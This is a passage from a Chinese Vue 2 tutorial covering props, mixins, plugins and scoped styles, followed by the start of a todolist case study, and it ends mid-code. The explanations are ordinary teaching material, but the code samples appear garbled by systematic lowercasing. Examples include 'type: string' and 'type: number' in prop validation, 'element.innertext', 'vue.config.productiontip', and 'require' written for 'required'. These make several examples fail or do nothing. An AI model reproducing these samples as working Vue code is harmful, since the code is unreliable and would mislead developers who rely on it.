"./student.vue";\nexport default {\n  name: "school",\n  components: {\n    student,\n  },\n  data() {\n    return { schoolname: "武汉大学", schooladdress: "武汉市武昌区珞珈山路" };\n  },\n  methods: {\n    getel() {\n      // 返回的是学校名有关的那个h2元素\n      console.log("通过ref获取的元素1：", this.$refs.sch);\n      // 返回的是student组件的实例\n      console.log("通过ref获取的元素2：", this.$refs.stud);\n    },\n  },\n};\n<\/script>\n\n<style>\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n\n# 3.4 props数据流向\n\n在父组件中调用子组件，有时候需要传递给子组件一些初始化数据，子组件拿这些数据进行渲染。\n\n我们使用props方式传参：在子组件被调用时的标签里（编写标签时），把传参作为该标签的属性；那么对应的，在子组件内部要使用props配置项进行参数的接收。如下代码，我们将school作为student的父组件，在子组件被调用处的<student>标签里加上name和age属性形式的传参，子组件student内部使用props: ["name", "age"]配置项进行接收。\n\n父组件school.vue：\n\n<template>\n  <div>\n    <h2>学校：{{ schoolname }}</h2>\n    <h2>地址：{{ schooladdress }}</h2>\n    <student name="张三" :age="18"></student>\n    <student name="李四" :age="20"></student>\n  </div>\n</template>\n\n<script>\nimport student from "./student.vue";\nexport default {\n  name: "school",\n  components: {\n    student,\n  },\n  data() {\n    return { schoolname: "武汉大学", schooladdress: "武汉市武昌区珞珈山路" };\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n子组件student.vue：\n\n<template>\n  <div>\n    <h1>{{ msg }}</h1>\n    <h2>学生姓名：{{ name }}</h2>\n    <h2>学生年龄：{{ age }}</h2>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "student",\n  // 使用字符串数组来接收父组件传来的数据\n  props: ["name", "age"],\n  data() {\n    return { msg: "我是一个学生" };\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n * 在使用props方式进行传参有几个注意点：\n   \n   1. 如果传参数据是静态字符串，就直接使用属性；如果是动态的或者非字符串，那就使用v-bind进行动态绑定（js表达式）。\n   \n   2. 如果你想将一个对象的所有属性都传过去，那使用v-bind="obj"，子组件内部使用对象属性名来接收；如果是将整个对象传过去就v-bind:param="obj"，子组件内部使用一个对象比如param来接收。\n      \n      // 将某个对象的所有属性通过props方式传过去\n      post: { id: 1, title: \'my journey with vue\'}\n      // 父组件模板里编写子组件标签，添上v-bind="post"\n      <blog-post v-bind="post"></blog-post>\n      // 与上面的写法效果完全一样，这个写法更麻烦\n      <blog-post\n        v-bind:id="post.id"\n        v-bind:title="post.title"\n      ></blog-post>\n      // 接收时就使用属性名来接收\n      props: [\'id\', \'title\']\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      8\n      9\n      10\n      11\n      \n   \n   3. 子组件内部的props配置项是与data和methods是平级的，props配置项用得最多的形式是字符串数组，vue初始化时会对这个数组进行解析，并将数组里解析好的字段放到this上（组件实例），也就是可以通过this直接访问这些字段（先于data解析）。\n\n * 另外，我们必须记住父子组件间的props是由父到子的单向数据流动（父通过props传数据给子，但子不能修改props）：\n   \n   1. 父组件里的data数据变化时，会引起父组件模板重新解析。如果父组件模板里的子组件使用了props方式传参，并且这个参数跟着父组件的data变化了，那么子组件内部的props配置项也会变化，子组件的模板也会重新解析。如果只是单纯的props方式传参，但是这个参数并没有随着父组件data的变化而变化，那子组件的props配置项以及模板都不会有变化，这一点非常重要！！！不是父组件变动了子组件就一定会变，只有props数据变了才会重新解析子组件的模板。\n   2. 子组件内部自己对props配置项进行修改，并不会引发父组件的数据以及模板的变化。如果要在子组件内部修改props应该怎么办？正确做法是使用data的变量转存一份props（用computed的变量来转存也可以），但是不能同名，控制台会报错；即使同名，也只会生效props的，这意味着props的解析先于data（data的同名并不会覆盖props里的）。要记住，props配置项是只读的，你不能修改它，否则会报错！\n   3. 但是有一个漏洞，如果props传过来的是一个完整的对象时（不是v-bind="obj"而是v-bind:param="obj"），直接修改对象的引用会报错（相当于重新赋一个新对象给引用，所以会报错），去修改对象上的某个属性就能修改成功的。不过不建议这么做！\n\n<template>\n  <div>\n    <h1>{{ msg }}</h1>\n    <h2>学生姓名：{{ name }}</h2>\n    <h2>学生年龄：{{ myage }}</h2>\n    \x3c!-- 不要妄想直接修改age，props是只读数据，这种数据流是单向的 --\x3e\n    <button @click="myage++">我想改一下年龄</button>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "student",\n  // 使用字符串数组来接收父组件传来的数据\n  props: ["name", "age"],\n  data() {\n    // 想改props里的age数据，那就使用data里的变量进行转存，但不能同名\n    // props先于data解析，所以这里能访问this.age也就是props里的age\n    return { msg: "我是一个学生", myage: this.age };\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nprops还有另外两种写法，是为了对props进行验证，用的比较少。一种方式是只限制数据类型，另一种方式是限制数据类型、限制必要性、指定默认值。\n\n<template>\n  <div>\n    <h1>{{ msg }}</h1>\n    <h2>学生姓名：{{ name }}</h2>\n    <h2>学生年龄：{{ age }}</h2>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "student",\n  // 限制属性的类型\n  /* props: {\n    name: string,\n    age: number,\n  }, */\n  // 限制类型、限制必要性、指定默认值。只有在非必要时才指定默认值。\n  props: {\n    name: {\n      type: string,\n      require: true, // 必要的\n    },\n    age: {\n      type: number,\n      require: false, // 非必要的，父组件那里就可以不用传了\n      default: 50, // 默认值，如果父组件那里没有传就是用默认值\n    },\n  },\n  data() {\n    return { msg: "我是一个学生" };\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. props配置项：让组件接收外部传来的数据。\n 2. 三种写法：\n    1. props: [\'name\', \'age\']只用于接收；\n    2. props: { name: string, age: number }，接收并限制类型；\n    3. props: { age: { type: number, require: false, default: 50 }}，接收并限制类型、限制必要性、指定默认值。\n 3. 父组件到子组件的props是单向的数据流动。\n    1. 父组件的data变化，会让父组件模板重新解析，然后子组件的props数据如果随着父组件data变化了，那子组件的模板也会重新解析，否则就算用了props方式传值，只要props数据不变就不会让子组件模板重新解析。\n    2. 子组件里的props配置项是只读的，修改就会报错。若想要修改props配置项里的数据，请将props数据复制到data里（computed也可），但不能同名。\n    3. 其实还能总结一条：子组件重新渲染只依赖于data和props的变化。\n\n----------------------------------------\n\n\n# 3.5 mixin混入\n\n在使用不同组件时，你可能会遇到他们的某些配置（data、methods等）是完全相同的或者一部分相同），这其实是可以进行代码复用的，vue给我们提供了配置共用的功能——mixin混入。\n\n首先是将共用的配置提取到一个单独的js文件里，这个js文件用于存放混入对象*，混入对象的各个属性就是共用的data、methods、mounted等，最后export出去。然后在组件里使用，先将混入对象import进来，再将混入对象里存的共用配置与组件本地的配置进行混合或者说合并，具体会涉及到一个新配置项mixins: [xxx]（数组形式），xxx就是混入对象。\n\n注意不是data整体覆盖了data（也不是methods覆盖了methods），是data中的属性进行合并（是methods中的方法进行合并），当然，不止是data、methods，还有computed、watch等。\n\n比如下面这个例子，我们将school和student调成平级的，并让他们的methods配置一样。我们在components目录下新建一个mixin.js（名字自定义），在这里放的是被复用的配置（代码完全相同）。\n\n// 分别导出 混入对象m1\nexport const m1 = {\n    // school和student的methods配置一样，所以被单独抽到这里\n    methods: {\n        showname() { alert(this.name); },\n    },\n}\n// 分别导出 混入对象m2\nexport const m2 = { // ... }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nschool.vue：\n\n<template>\n  <div>\n    <h2 @click="showname">学校：{{ name }}</h2>\n    <h2 @click="showmsg">地址：{{ address }}</h2>\n  </div>\n</template>\n\n<script>\n// 导入混入对象m1\nimport { m1 } from "./mixin";\nexport default {\n  name: "school",\n  data() {\n    return { name: "武汉大学", address: "武汉市武昌区珞珈山路" };\n  },\n  // 使用mixins配置项，将公用的methods和组件本地的methods混在一起\n  mixins: [m1],\n  methods: {\n    // 与student的showmsg代码不一样，所以它不能提取到mixin.js\n    showmsg() { alert(this.address); },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\nstudent.vue：\n\n<template>\n  <div>\n    <h2 @click="showname">学生姓名：{{ name }}</h2>\n    <h2 @click="showmsg">学生年龄：{{ age }}</h2>\n  </div>\n</template>\n\n<script>\n// 导入混入对象m1\nimport { m1 } from "./mixin";\nexport default {\n  name: "student",\n  data() {\n    return { name: "张三", age: 20 };\n  },\n  // 使用mixins配置项，将公用的methods和组件本地的methods混在一起\n  mixins: [m1],\n  methods: {\n    // 与school的showmsg代码不一样，所以它不能提取到mixin.js\n    showmsg() { alert(this.age); },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n像data、methods等配置项，如果混合对象与组件本地有同名的属性或方法，那么合并的时候以组件本地为主。而mounted这种生命周期钩子被提取到混合对象里，并且组件本地也写了mounted生命钩子，那两个地方的生命周期都会运行（mixin运行一遍，组件本地运行一遍），并不像data、methods等的合并。\n\n----------------------------------------\n\n总结拓展：\n\n 1. mixin混入：可以把多个组件共用的配置提取成一个混入对象。\n 2. 使用方法：\n    1. 定义混入对象：const m1 = {methods: {}}。\n    2. 使用混入对象：在配置对象中加入mixins: [m1]，前提是import导入进来了。\n 3. 以上是局部混入，其实也能全局混入，使用得很少。全局混入定义时vue.mixin(xxx)，会给每个vc以及vm混入配置。全局混入在使用时不再需要mixins:[m1, m2]配置项了。\n\n----------------------------------------\n\n\n# 3.6 插件\n\n插件是用于增强vue的功能，比如过滤器、自定义指令、mixin混入都可以放到vue上进行全局使用。\n\n插件是定义在一个单独的js里，它具有一个重要的方法叫做install，在这个方法中进行过滤器、自定义指令、minxin混入等全局注册。install(vue, a, b, c)的第一个入参就是vue构造函数，后面的入参是使用处vue.use(plugins, a, b c)中出传的a、b、c。\n\n新建一个plugins.js：\n\n// 定义一个插件\nexport default {\n    install(vue) {\n        // 全局配置\n        vue.config.productiontip = false\n        // 全局过滤器\n        vue.filter(\'addstr\', function (value) {\n            return value + \'测试结果成功\';\n        });\n        // 全局自定义指令\n        vue.directive(\'big\', function (element, binding) {\n            element.innertext = binding.value + \'测试结果成功\';\n        });\n        // 全局mixin混入\n        vue.mixin({\n            data() {\n                return {\n                    test1: \'测试全局过滤器：\',\n                    test2: \'测试全局自定义指令：\'\n                }\n            },\n            methods: {\n                showname() {\n                    alert(this.name);\n                }\n            },\n        });\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n在main.js中使用插件：\n\nimport vue from \'vue\'\nimport app from \'./app.vue\'\nimport plugins from \'./plugins\'\n\n// 使用插件\nvue.use(plugins);\n\nnew vue({\n  el: \'#app\',\n  render: h => h(app),\n  components: { app }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n在school.vue中使用全局过滤器、全局自定义指令、全局混入：\n\n<template>\n  <div>\n    \x3c!-- showname是全局混入的一个方法，name是组件本地data中的数据 --\x3e\n    <h2 @click="showname">学校：{{ name }}</h2>\n    \x3c!-- address是组件本地data数据 --\x3e\n    <h2>地址：{{ address }}</h2>\n    \x3c!-- test1是全局混入的data数据，addstr是全局过滤器 --\x3e\n    <h2>{{ test1 | addstr }}</h2>\n    \x3c!-- test2是全局混入的data数据，v-big是全局自定义指令 --\x3e\n    <h2 v-big="test2"></h2>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "school",\n  data() {\n    return { name: "武汉大学", address: "武汉市武昌区珞珈山路" };\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n在student.vue中使用全局过滤器、全局自定义指令、全局混入：\n\n<template>\n  <div>\n    \x3c!-- showname是全局混入的一个方法，name是组件本地data中的数据 --\x3e\n    <h2 @click="showname">学生姓名：{{ name }}</h2>\n    \x3c!-- age是组件本地data数据 --\x3e\n    <h2>学生年龄：{{ age }}</h2>\n    \x3c!-- test1是全局混入的data数据，addstr是全局过滤器 --\x3e\n    <h2>测试全局过滤器：{{ test1 | addstr }}</h2>\n    \x3c!-- test2是全局混入的data数据，v-big是全局自定义指令 --\x3e\n    <h2 v-big="test2"></h2>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "student",\n  data() {\n    return { name: "张三", age: 20 };\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 插件功能：用于增强vue。\n 2. 插件本质：包含install方法的一个对象，install第一个参数是vue，之后的参数是插件使用者传入的。\n 3. 定义插件：对象.install = function(vue, a, b, c) {}，install方法中加vue.filter(...)、vue.directive()等。\n 4. 使用插件：vue.use(对象, a, b, c)，这个对象就是上面那个“对象”，abc是多余可以自己传的参数。\n\n----------------------------------------\n\n\n# 3.7 scoped样式\n\n两个平级的组件，在使用样式的时候，遇到同名class，它们class对应的样式各不相同，但是只生效后引用的同名class样式。vue其实给我们解决了不同组件的同名class样式冲突的问题，只需要在将scoped加到<style>上就可以解决，即<style scoped></style>。\n\n需要注意的是app.vue里经常加公用样式，所以app.vue的<style>里很少加上scoped。\n\nschool.vue：\n\n<template>\n  <div class="test">\n    <h2 class="title">学校：{{ name }}</h2>\n    <h2>地址：{{ address }}</h2>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "school",\n  data() {\n    return { name: "武汉大学", address: "武汉市武昌区珞珈山路" };\n  },\n};\n<\/script>\n\x3c!-- 加上scoped解决class同名问题 --\x3e\n<style scoped>\n.test { background-color: blue; }\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nstudent.vue：\n\n<template>\n  <div class="test">\n    <h2 class="title">学生姓名：{{ name }}</h2>\n    <h2>学生年龄：{{ age }}</h2>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "student",\n  data() {\n    return { name: "张三", age: 20 };\n  },\n};\n<\/script>\n\x3c!-- 加上scoped解决class同名问题 --\x3e\n<style scoped>\n.test { background-color: green; }\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nmain.js：\n\nimport vue from \'vue\'\nimport app from \'./app.vue\'\n\nnew vue({\n  el: \'#app\',\n  render: h => h(app),\n  components: { app }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 四、todolist案例\n\n\n# 4.1 将页面拆分成组件\n\n\n\ntodolist静态图如下，这一节是将todolist拆分成一个个组件，要注意的是按照功能点来拆分。将顶部的输入框作为addtodo组件，将中间的todo展示列表作为todomain组件，将底部的删除、清空等按钮取作为totaltodo组件；todomain组件是可以进一步拆分成一个个todoitem组件的。最后将addtodo、todomain、totaltodo放入app.vue里。\n\n\n\n容器app.vue：\n\n<template>\n  <div class="todo-container">\n    <addtodo></addtodo>\n    <todomain></todomain>\n    <totaltodo></totaltodo>\n  </div>\n</template>\n\n<script>\nimport addtodo from "./components/addtodo.vue";\nimport todomain from "./components/todomain.vue";\nimport totaltodo from "./components/totaltodo.vue";\n\nexport default {\n  name: "app",\n  components: {\n    addtodo,\n    todomain,\n    totaltodo,\n  },\n};\n<\/script>\n\n<style>\n/*base*/\nbody {\n  background: #fff;\n}\n.btn {\n  display: inline-block;\n  padding: 4px 12px;\n  margin-bottom: 0;\n  font-size: 14px;\n  line-height: 20px;\n  text-align: center;\n  vertical-align: middle;\n  cursor: pointer;\n  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2),\n    0 1px 2px rgba(0, 0, 0, 0.05);\n  border-radius: 4px;\n}\n.btn-danger {\n  color: #fff;\n  background-color: #da4f49;\n  border: 1px solid #bd362f;\n}\n.btn-danger:hover {\n  color: #fff;\n  background-color: #bd362f;\n}\n.btn:focus {\n  outline: none;\n}\n.todo-container {\n  width: 600px;\n  margin: 0 auto;\n}\n.todo-container .todo-wrap {\n  padding: 10px;\n  border: 1px solid #ddd;\n  border-radius: 5px;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n\n\n顶部的输入框addtodo.vue：\n\n<template>\n  <div class="todo-header">\n    <input type="text" placeholder="请输入你的任务名称，按回车键确认" />\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "addtodo",\n};\n<\/script>\n\n<style scoped>\n/*header*/\n.todo-header input {\n  width: 585px;\n  height: 28px;\n  font-size: 14px;\n  border: 1px solid #ccc;\n  border-radius: 4px;\n  padding: 4px 7px;\n}\n.todo-header input:focus {\n  outline: none;\n  border-color: rgba(82, 168, 236, 0.8);\n  box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075),\n    0 0 8px rgba(82, 168, 236, 0.6);\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n中间的todo展示区域todomain.vue：\n\n<template>\n  <ul class="todo-main">\n    <todoitem></todoitem>\n    <todoitem></todoitem>\n    <todoitem></todoitem>\n  </ul>\n</template>\n\n<script>\nimport todoitem from "./todoitem.vue";\nexport default {\n  name: "todomain",\n  components: { todoitem },\n};\n<\/script>\n\n<style scoped>\n/*main*/\n.todo-main {\n  margin-left: 0px;\n  border: 1px solid #ddd;\n  border-radius: 2px;\n  padding: 0px;\n}\n.todo-empty {\n  height: 40px;\n  line-height: 40px;\n  border: 1px solid #ddd;\n  border-radius: 2px;\n  padding-left: 5px;\n  margin-top: 10px;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n底部的删除清空按钮区域totaltodo.vue：\n\n<template>\n  <div class="todo-footer">\n    <label>\n      <input type="checkbox" />\n    </label>\n    <span> <span>已完成0</span> / 全部2 </span>\n    <button class="btn btn-danger">清除已完成任务</button>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "totaltodo",\n};\n<\/script>\n\n<style scoped>\n/*footer*/\n.todo-footer {\n  height: 40px;\n  line-height: 40px;\n  padding-left: 6px;\n  margin-top: 5px;\n}\n.todo-footer label {\n  display: inline-block;\n  margin-right: 20px;\n  cursor: pointer;\n}\n.todo-footer label input {\n  position: relative;\n  top: -1px;\n  vertical-align: middle;\n  margin-right: 5px;\n}\n.todo-footer button {\n  float: right;\n  margin-top: 5px;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\ntodomain里的todoitem：\n\n<template>\n  <li>\n    <label>\n      <input type="checkbox" />\n      <span>xxxxx</span>\n    </label>\n    <button class="btn btn-danger">删除</button>\n  </li>\n</template>\n\n<script>\nexport default {\n  name: "todoitem",\n};\n<\/script>\n\n<style scoped>\n/*item*/\nli {\n  list-style: none;\n  height: 36px;\n  line-height: 36px;\n  padding: 0 5px;\n  border-bottom: 1px solid #ddd;\n}\nli label {\n  float: left;\n  cursor: pointer;\n}\nli label li input {\n  vertical-align: middle;\n  margin-right: 6px;\n  position: relative;\n  top: -1px;\n}\nli button {\n  float: right;\n  display: none;\n  margin-top: 3px;\n}\nli:before {\n  content: initial;\n}\nli:last-child {\n  border-bottom: none;\n}\nli:hover {\n  background-color: #ddd;\n}\nli:hover button {\n  display: block;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n\n\n# 4.2 初始化操作-列表渲染\n\n初始化列表，首先在data里构造一个数组todos，每一项存储id编号、title名称、done是否完成；然后使用v-for对todos进行遍历来构造展示todo列表，在<todoitem>里使用v-for="todo in todos"，不要忘记加上:key="todo.id"；再就是要给todoitem子组件进行传参，准备一个属性todoitem，并动态绑定单项数据，即:todoitem="todo"；最后todoitem要接收父组件传来的数据，使用props: [\'todoitem\']。\n\ntodomain.vue：\n\n<template>\n  <ul class="todo-main">\n    <todoitem v-for="todo in todos" :key="todo.id" :todoitem="todo"></todoitem>\n  </ul>\n</template>\n\n<script>\nimport todoitem from "./todoitem.vue";\nexport default {\n  name: "todomain",\n  components: { todoitem },\n  data() {\n    return {\n      todos: [\n        { id: "001", title: "吃饭", done: true },\n        { id: "002", title: "学习", done: false },\n        { id: "003", title: "游戏", done: false },\n      ],\n    };\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\ntodoitem.vue接收数据，并可以对checkbox和span绑定值：\n\n<template>\n  <li>\n    <label>\n      <input type="checkbox" :checked="todoitem.done" />\n      <span>{{ todoitem.title }}</span>\n    </label>\n    <button class="btn btn-danger">删除</button>\n  </li>\n</template>\n\n<script>\nexport default {\n  name: "todoitem",\n  props: ["todoitem"],\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 4.3 添加操作-状态提升\n\n前一小节todos数据是存放在todomain里进行列表渲染，而这一小节要开发addtodo组件的添加item功能，这样就会用到todos数据。这两个平级的组件都会读取或修改todos数据，那就涉及到组件间通信了。\n\n在前面章节里只说过父组件向子组件传参使用props方式，这是一种父到子的单向通信。而这一小节主要讲一个最简单的组件间通信（双向），它就是状态提升。其实在后面章节里会讲全局事件总线和vuex等高级的组件间通信技术，但这是后话了。\n\n所谓的状态提升，就是将多个子组件的共用数据提升到父组件里。如果哪个子组件想读取数据了（为了展示渲染），就通过props方式将需要的数据传递给子组件（父===>子）；重点来了，如果哪个子组件想操作数据了（为了修改父组件里的原始数据），就将定义在父组件里的“操作数据的方法”，通过props方式将该方法的引用来传递给子组件，那么子组件手握该方法引用并可以调用它去修改父组件里的原始数据了（子===>父）。\n\n按照状态提升，我们假设a组件修改了父组件里的存储数据，并且该数据在之前就通过porps方式传给了b组件，那么该数据被a修改b就会重新读取（至于b为什么重新读取，可以看3.4 props数据流向这一节内容）。这样的情景反过来，b修改数据那a也会重新读取，这就达到了a与b进行了双向通信的目的。父组件充当了子组件双向通信的一个桥梁。\n\n我们要对上一小节的代码做简单的修改，将todos数据存到app这个父组件里，子组件todomain通过props配置接收传来的todos数据。还有，父组件app要提前将修改数据的方法通过props传递给addtodo。\n\napp.vue：\n\n<template>\n  <div class="todo-container">\n    \x3c!-- 要给addtodo提供修改todos数据的方法 --\x3e\n    <addtodo :addtodo="addtodo"></addtodo>\n    \x3c!-- 要将todos数据传给todomain进行展示 --\x3e\n    <todomain :todos="todos"></todomain>\n    <totaltodo></totaltodo>\n  </div>\n</template>\n\n<script>\nimport addtodo from "./components/addtodo.vue";\nimport todomain from "./components/todomain.vue";\nimport totaltodo from "./components/totaltodo.vue";\n\nexport default {\n  name: "app",\n  components: {\n    addtodo,\n    todomain,\n    totaltodo,\n  },\n  data() {\n    return {\n      // 初始化todos数组，状态提升，将数据放到两个组件的父组件里，通过父组件这个桥梁进行通信\n      todos: [\n        { id: "001", title: "吃饭", done: true },\n        { id: "002", title: "学习", done: false },\n        { id: "003", title: "游戏", done: false },\n      ],\n    };\n  },\n  methods: {\n    // 通过props的方式将addtodo方法暴露给addtodo去使用，是为了修改todos数据\n    addtodo(item) {\n      // unshift方法可以触发模板重新解析\n      this.todos.unshift(item);\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\ntodomain.vue：\n\n<template>\n  <ul class="todo-main">\n    \x3c!-- 使用app传来的todos数组 --\x3e\n    <todoitem v-for="todo in todos" :key="todo.id" :todoitem="todo"></todoitem>\n  </ul>\n</template>\n\n<script>\nimport todoitem from "./todoitem.vue";\nexport default {\n  name: "todomain",\n  components: { todoitem },\n  // 接收app传来的todos数组\n  props: ["todos"],\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\naddtodo.vue：\n\n<template>\n  <div class="todo-header">\n    <input\n      type="text"\n      placeholder="请输入你的任务名称，按回车键确认"\n      v-model.trim="title"\n      @keyup.enter="additem"\n    />\n  </div>\n</template>\n\n<script>\nimport { nanoid } from "nanoid";\nexport default {\n  name: "addtodo",\n  // 接收app传来的addtodo，用于修改app里的todos数组\n  props: ["addtodo"],\n  data() {\n    return {\n      title: "",\n    };\n  },\n  methods: {\n    additem() {\n      if (!this.title) return;\n      // 使用nanoid库生成一个唯一id\n      const item = { id: nanoid(), title: this.title, done: false };\n      // 使用app传来的addtodo，用于修改app里的todos数组（新增一项）\n      this.addtodo(item);\n      this.title = "";\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# 4.4 勾选和删除\n\n在3.4 props配置项这节里，说过props是只读的，但它是对象时，其实能成功修改它的属性值。我们可以利用props这个漏洞搭配v-model，快速实现todoitem组件里的checkbox动态响应（勾上or取消，对应数据也改变）。\n\n<template>\n  <li>\n    <label>\n      \x3c!-- 利用`props`和v-model实现勾选框与数据之间的动态响应 --\x3e\n      <input type="checkbox" v-model="todoitem.done" />\n      <span>{{ todoitem.title }}</span>\n    </label>\n    <button class="btn btn-danger">删除</button>\n  </li>\n</template>\n\n<script>\nexport default {\n  name: "todoitem",\n  props: ["todoitem"],\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n可以看到上面就用了一行代码就达到了勾选框与数据之间的动态响应，确实是非常方便。但这违背了props只读的原则，那么就只能用上一小节的状态提升来实现了。在使用状态提升实现item的勾选时我们顺带实现一下删除。\n\napp.vue：\n\n<template>\n  <div class="todo-container">\n    <addtodo :addtodo="addtodo"></addtodo>\n    \x3c!-- 通过props将方法传递给子组件 --\x3e\n    <todomain\n      :todos="todos"\n      :checktodo="checktodo"\n      :deletetodo="deletetodo"\n    ></todomain>\n    <totaltodo></totaltodo>\n  </div>\n</template>\n\n<script>\nimport addtodo from "./components/addtodo.vue";\nimport todomain from "./components/todomain.vue";\nimport totaltodo from "./components/totaltodo.vue";\n\nexport default {\n  name: "app",\n  components: {\n    addtodo,\n    todomain,\n    totaltodo,\n  },\n  data() {\n    return {\n      todos: [\n        { id: "001", title: "吃饭", done: true },\n        { id: "002", title: "学习", done: false },\n        { id: "003", title: "游戏", done: false },\n      ],\n    };\n  },\n  methods: {\n    addtodo(item) {\n      this.todos.unshift(item);\n    },\n    // 给todoitem提供的方法，用于修改done字段\n    checktodo(id) {\n      if (!id) return;\n      for (let i = 0; i < this.todos.length; i++) {\n        const item = this.todos[i];\n        if (item.id === id) {\n          item.done = !item.done;\n          break;\n        }\n      }\n    },\n    // 给todoitem提供的方法，用于删除一项\n    deletetodo(id) {\n      if (!id) return;\n      this.todos = this.todos.filter((item) => item.id !== id);\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\ntodomain.vue：\n\n<template>\n  <ul class="todo-main">\n    <todoitem\n      v-for="todo in todos"\n      :key="todo.id"\n      :todoitem="todo"\n      :checktodo="checktodo"\n      :deletetodo="deletetodo"\n    ></todoitem>\n  </ul>\n</template>\n\n<script>\nimport todoitem from "./todoitem.vue";\nexport default {\n  name: "todomain",\n  components: { todoitem },\n  props: ["todos", "checktodo", 